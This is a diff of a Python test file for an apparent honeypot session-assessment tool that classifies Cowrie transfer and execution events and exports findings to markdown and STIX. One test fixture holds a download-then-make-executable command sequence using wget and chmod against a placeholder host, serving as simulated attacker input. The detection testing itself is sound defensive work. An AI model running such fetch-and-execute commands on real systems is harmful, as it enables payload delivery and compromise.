@@ -274,7 +274,7 @@ def test_cached_graph_mismatch_is_ignored_and_rebuilt_deterministically() -> Non
     assert "forged" not in str(with_cache["canonical_evidence"])
 
 
-def test_connected_finding_suppresses_evidence_covered_independent_duplicates() -> None:
+def test_noneligible_transfer_attempt_does_not_create_connected_transfer_finding() -> None:
     commands = [
         "wget https://example.invalid/a -O /tmp/a",
         "chmod +x /tmp/a",
@@ -293,13 +293,15 @@ def test_connected_finding_suppresses_evidence_covered_independent_duplicates() 
         behavior_policy_path=BEHAVIOR_POLICY,
         classification_policy_path=CLASSIFICATION_POLICY,
     )
+    assert "connected_artifact_activity" not in {
+        item["finding_type"] for item in report["behavioral_findings"]
+    }
     assert [item["finding_type"] for item in report["behavioral_findings"]] == [
-        "connected_artifact_activity"
+        "attempted_artifact_execution"
     ]
-    assert report["behavioral_findings"][0]["relationship_refs"]
 
 
-def test_v4_hypotheses_are_falsifiable_alternatives_not_behavior_findings() -> None:
+def test_typed_transfer_observation_does_not_authorize_follow_on_hypothesis() -> None:
     payload = _payload()
     payload["raw_events"].append({
         "session": payload["session_id"],
@@ -315,21 +317,32 @@ def test_v4_hypotheses_are_falsifiable_alternatives_not_behavior_findings() -> N
         behavior_policy_path=BEHAVIOR_POLICY,
         classification_policy_path=CLASSIFICATION_POLICY,
     )
-    assert len(report["hypothesis_sets"]) == 1
-    alternatives = report["hypothesis_sets"][0]["hypotheses"]
-    assert len(alternatives) == 2
-    assert all(item["falsification_conditions"] for item in alternatives)
-    assert report["hypothesis_sets"][0]["alternatives_are_exhaustive"] is False
-    assert all(
-        item["hypothesis_id"] not in {
-            finding["finding_id"] for finding in report["behavioral_findings"]
-        }
-        for item in alternatives
-    )
+    assert report["hypothesis_sets"] == []
+    assert "observed_cowrie_transfer_event" in {
+        item["finding_type"] for item in report["behavioral_findings"]
+    }
+    assert "hunt-observed-transfer-indicators" in {
+        item["action_id"]
+        for item in report["response_guidance_v3"]["advisory_actions"]
+    }
 
 
 def test_v4_consumers_share_findings_hypotheses_refs_and_provenance(tmp_path: Path) -> None:
-    report = _build()
+    payload = _payload()
+    payload["raw_events"].append({
+        "session": payload["session_id"],
+        "timestamp": "2026-07-28T01:00:01Z",
+        "eventid": "cowrie.session.file_download",
+        "url": "https://example.invalid/a",
+        "outfile": "/tmp/a",
+        "shasum": "a" * 64,
+    })
+    report = build_session_assessment_v4(
+        [payload],
+        raw_events=payload["raw_events"],
+        behavior_policy_path=BEHAVIOR_POLICY,
+        classification_policy_path=CLASSIFICATION_POLICY,
+    )
     summary = _report_summary(report, {})
     assert summary["schema_version"] == "session_assessment.v4"
     assert report["behavioral_findings"][0]["statement"] in summary["summary"]
@@ -340,14 +353,14 @@ def test_v4_consumers_share_findings_hypotheses_refs_and_provenance(tmp_path: Pa
     assert report["behavioral_findings"][0]["finding_id"] in panel
     assert report["provenance"]["evidence_sha256"] in panel
 
-    markdown_path = Path(write_markdown_report(report, _payload(), tmp_path))
+    markdown_path = Path(write_markdown_report(report, payload, tmp_path))
     markdown = markdown_path.read_text(encoding="utf-8")
     finding = report["behavioral_findings"][0]
     assert finding["finding_id"] in markdown
     assert finding["evidence_refs"][0] in markdown
     assert report["provenance"]["evidence_sha256"] in markdown
 
-    bundle = build_stix_bundle(report, _payload())
+    bundle = build_stix_bundle(report, payload)
     finding_objects = [
         item for item in bundle["objects"] if item.get("type") == "x-honeypot-behavioral-finding"
     ]
